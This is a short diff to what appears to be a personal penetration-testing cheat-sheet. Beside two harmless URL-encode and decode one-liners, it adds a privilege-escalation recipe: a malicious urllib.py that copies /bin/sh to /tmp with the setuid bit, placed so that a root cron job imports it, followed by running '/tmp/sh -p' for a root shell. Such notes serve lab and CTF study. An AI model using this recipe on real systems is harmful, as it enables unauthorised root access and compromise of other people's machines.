@@ -16,3 +16,10 @@ python3 -c "import urllib.parse; print(urllib.parse.quote('<STRING>'))"
 
 # url decode
 python3 -c "import urllib.parse; print(urllib.parse.unquote('<ENCODED_STRING>'))"
+
+# PRIVESC import highjacking
+eg: python script run by CRON in context of root
+eg: python script imports urllib
+echo 'import os;os.system("cp /bin/sh /tmp/sh;chmod u+s /tmp/sh")' > urllib.py
+wait for CRON job to trigger
+/tmp/sh -p
